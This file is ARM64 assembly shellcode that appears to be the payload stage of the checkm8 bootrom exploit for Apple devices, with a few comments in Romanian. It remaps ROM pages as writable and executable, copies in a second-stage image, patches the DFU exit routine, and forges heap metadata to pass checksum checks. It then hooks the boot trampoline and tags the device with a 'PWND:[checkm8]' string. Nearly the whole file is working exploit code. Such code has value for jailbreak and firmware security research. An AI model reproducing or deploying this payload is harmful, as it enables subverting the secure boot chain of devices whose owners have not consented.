//.set iSerialNumber,                 0x1800008FA
//.set usb_create_string_descriptor,  0x10000AE80
.set tlbi,                          0x1000004AC

//ROM Patching
.set PAGE_TABLE_ROM_ENTRY,          0x18000C400
.set rom_rwx,                       0x100000625
.set DEVICE_ASSIGNMENT,             0x1000079DC
//.set HEAP_VERIFY,                   0x10000DB98
//.set VERIFY_CHECKSUM,               0x10000D26C
//.set VERIFY_PADDING,                0x10000D81C
//.set HEAP_CALC_CHECK,               0x10000D4EC
.set HEAP_BASE,                     0x1801E8000
.set INSECURE_MEMORY,               0x18001c000
.set DESTINATION,                   0x1801E4000
.set WRITE_CHECKSUM,                0x10000D4EC
.set dfu_state,                     0x1800085B2
.set dfu_done,                      0x1800085B0
.set event_signal,                  0x1000098B4
//Trampoline
.set BOOT_TRAMPOLINE,               0x180018000

//.set PAGE_TABLE_BASE_POINTER,       0x1000081f0
//.set PAGE_TABLE_END_POINTER,        0x1000081f8
//.set new_table_base_value,          0x1801e8000
//.set new_table_end_value,           0x1801e8040
.set gUSBSerialNumber,             0x180003A78
.set gUSBSRNMStringDescriptor,     0x1800008FA
.set gUSBDescriptors,              0x180008528
.set usb_create_string_descriptor, 0x10000AE80

.text
.global _main
.align 0x10
_main:
_image_rwx:
  adr x1, link_reg
  str x30, [x1]

  ldr x0, =PAGE_TABLE_ROM_ENTRY
  ldr x1, =rom_rwx
  str x1, [x0]
  ldr x0, =tlbi
  blr x0

_copy_boot_companion:
  ldr x0, =DESTINATION  // x0 = dest
  ldr x1, =INSECURE_MEMORY
  add x1, x1, 0x800 //  x1 = insecure + 0x800 = src
  mov x2, 0x4000 //lungimea maxima
  add x3, x0, x2  // x3 = dest + 0x4000
_loop:
  ldp x4, x5, [x1], 0x10
  stp x4, x5, [x0], 0x10
  cmp x0, x3
  bne _loop //while(dest != dest + 0x4000)

_exit_dfu:  // heap corruption??
  ldr x1, =DEVICE_ASSIGNMENT
  ldr w0, _exit_dfu_patch
  str w0, [x1]

_repair_heap:
  ldr x0, =HEAP_BASE
  add x0, x0, 0x5000
  bl _copy_heap

  adr x0, change
  mov x1, 8
  str x1, [x0]

  mov x2, 0x80
  ldr x0, =HEAP_BASE
  add x0, x0, 0x5000
  add x0, x0, x2
  bl _copy_heap

_hook_trampoline:
  ldr x1, =BOOT_TRAMPOLINE
  adr x2, _trampoline_patch
  ldr x0, [x2]
  str x0, [x1]
  add x1, x1, 8
  add x2, x2, 8
  ldr w0, [x2]
  str w0, [x1]

  ldr x0, =tlbi
  blr x0
  b _exit_shellcode

link_reg:
.quad 0

_exit_dfu_patch:
  movz w8, 0x3
  //add w19, w19, 1
_ret:
  ret
_trampoline_patch:
  mov x4,   0x180000000
  add x4, x4,  0x1e4000
  blr x4

_heap_block1:
  .quad 0 // putem folosi acest quad si ca scratch pentru ca o sa il scriem oricum separat
  .quad 0
  .quad 0
  .quad 0x1800086A0
  .quad 2
change:
  .quad 132
  .quad 128
  .quad 0

temporary_rom_entry: .quad 0x100000625

_copy_heap:
  // x0 - dest
  // x1 - src
  // x2 - size
  adr x1, _heap_block1
  mov x2, 64
  mov x5, x0
  add x3, x5, x2
copy_loop:
  ldr x4, [x1], 8
  str x4, [x5], 8
  cmp x5, x3
  bne copy_loop
  ldr x1, =WRITE_CHECKSUM
  br x1

_exit_shellcode:

  sys  #0, c7, c5, #0
  dsb  SY
  isb

  mov x19, 0
  adr x1, link_reg
  ldr x30, [x1]
  ret

PWND_STRING:
.asciz " PWND:[checkm8]"
